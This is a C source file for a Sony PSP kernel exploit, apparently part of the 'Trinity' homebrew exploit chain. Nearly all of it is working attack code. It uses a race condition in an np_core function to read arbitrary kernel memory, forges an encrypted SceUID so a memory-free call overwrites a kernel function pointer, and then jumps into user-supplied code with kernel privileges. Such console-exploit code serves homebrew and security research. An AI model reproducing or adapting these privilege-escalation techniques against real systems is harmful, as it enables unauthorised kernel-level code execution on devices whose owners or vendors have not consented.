#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

/*
SceUID kernel exploit by qwikrazor87.
Read only kernel exploit by TheFl0w.
Part of Trinity exploit chain.
Put together by Acid_Snake and meetpatty.
*/

#define LIBC_CLOCK_OFFSET_660  0x88014400
#define LIBC_CLOCK_OFFSET_360  0x88014D80
#define LIBC_CLOCK_OFFSET_365  0x88014D00
#define SYSMEM_SEED_OFFSET_365 0x88014E38
#define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8

#define FAKE_UID_OFFSET        0x80

UserFunctions* g_tbl;
int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);

/* Actual code to trigger the kram read vulnerability.
    We can read the value stored at any location in Kram.
*/
static volatile int running;
static volatile int idx;
static int input[3];
static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;

static int racer(SceSize args, void *argp) {
  running = 1;

  while (running) {
    input[1] = 0;
    g_tbl->KernelDelayThread(10);
    input[1] = idx;
    g_tbl->KernelDelayThread(10);
  }

  return g_tbl->KernelExitDeleteThread(0);
}
u32 readKram(u32 addr){
  SceUID thid = g_tbl->KernelCreateThread("", racer, 8, 0x1000, 0, NULL);
  if (thid < 0)
    return 0;

  g_tbl->KernelStartThread(thid, 0, NULL);

  char string[8];
  int round = 0;

  idx = -83; // relative offset 0xB00 in np_core.prx (0xD98 + (-83 << 3))

  int i;
  for (i = 0; i < 100000; i++) {
    u32 res = _sceNpCore_8AFAB4A0(input, string, sizeof(string));
    if (res != 5 && res != 0x80550203) {
      switch (round) {
        case 0:
          round = 1;
          idx = (addr - (res - 0xA74) - 0xD98) >> 3;
          break;
        case 1:
          running = 0;
          return res;
      }
    }
  }

  running = 0;
  return 0;
}

void repairInstruction(KernelFunctions* k_tbl) {
  /*
    SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
    _sw(mod->text_addr + 0x3904, libc_clock_offset);
    k_tbl->KernelIcacheInvalidateAll();
    k_tbl->KernelDcacheWritebackInvalidateAll(); 
  */
}

int stubScanner(UserFunctions* tbl){
    int res = 0;
    g_tbl = tbl;
    tbl->freeMem(tbl);

    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
    _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);

    PRTSTR1("_sceNpCore_8AFAB4A0: %p", _sceNpCore_8AFAB4A0);

    return 0;
}

/*
FakeUID kxploit
*/

int doExploit(void) {

    int res;
    u32 seed = 0;

    if (_sceNpCore_8AFAB4A0 != NULL){
      u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
      PRTSTR1("test_val: %p", test_val);
      if (test_val == 0x8F154E38){
        seed = readKram(SYSMEM_SEED_OFFSET_365);
        libc_clock_offset = LIBC_CLOCK_OFFSET_365;
      }
      else if (test_val == 0x8FBF003C){
        libc_clock_offset = LIBC_CLOCK_OFFSET_660;
      }
    }

    // Allocate dummy block to improve reliability
    char dummy[32];
    memset(dummy, 'a', sizeof(dummy));
    SceUID dummyid;
    for (int i=0; i<10; i++)
      dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);

    // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
    u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
    u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
    SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
    SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A

    // Plant UID data structure into kernel as string
    u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);

    g_tbl->KernelDcacheWritebackAll();

    // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
    res = g_tbl->KernelFreePartitionMemory(uid);

    g_tbl->KernelDcacheWritebackAll();
   
    if (res < 0) return res;

    return 0;
}

void executeKernel(u32 kernelContentFunction){
  // Make a jump to kernel function
  _sw(JUMP(KERNELIFY(kernelContentFunction)), 0x08888888);
  _sw(NOP, 0x08888888+4);
  g_tbl->KernelDcacheWritebackAll();

  // Execute kernel function
  g_tbl->KernelLibcClock();
}
